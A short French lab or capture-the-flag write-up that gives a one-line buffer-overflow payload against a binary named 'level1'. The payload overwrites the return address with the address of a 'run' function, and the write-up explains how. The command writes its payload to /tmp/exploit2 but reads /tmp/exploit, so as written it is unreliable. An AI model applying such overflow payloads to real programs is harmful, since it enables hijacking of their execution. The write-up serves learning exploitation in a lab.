# Exploit: Buffer Overflow avec redirection de flux d'exécution

**Commande**:  
```bash
python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit2; cat /tmp/exploit - | ./level1
```
**Explication**:  
Dans cet exploit, nous avons dépassé la taille du tampon prévu en imprimant 76 caractères "a", suivis de l’adresse 0x08 04 84 44, qui est l’adresse de la fonction **run**. Cette adresse sera utilisée comme nouvelle adresse de retour, permettant ainsi de rediriger l’exécution vers la fonction **run**.  
On peut obtenir l’adresse de **run** avec `gdb` ou `objdump -d`.

**Ressources**:  
- [Buffer Overflow Exploit](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/)  
- [unix.stackexchange.com](https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process)  
- [stackoverflow.com](https://stackoverflow.com/questions/44469372/exploiting-buffer-overflow-using-gets-in-a-simple-c-program)  
- [Overflows : passons à la pratique (kali-linux.fr)](https://www.kali-linux.fr/hacking/overflows-passons-a-la-pratique)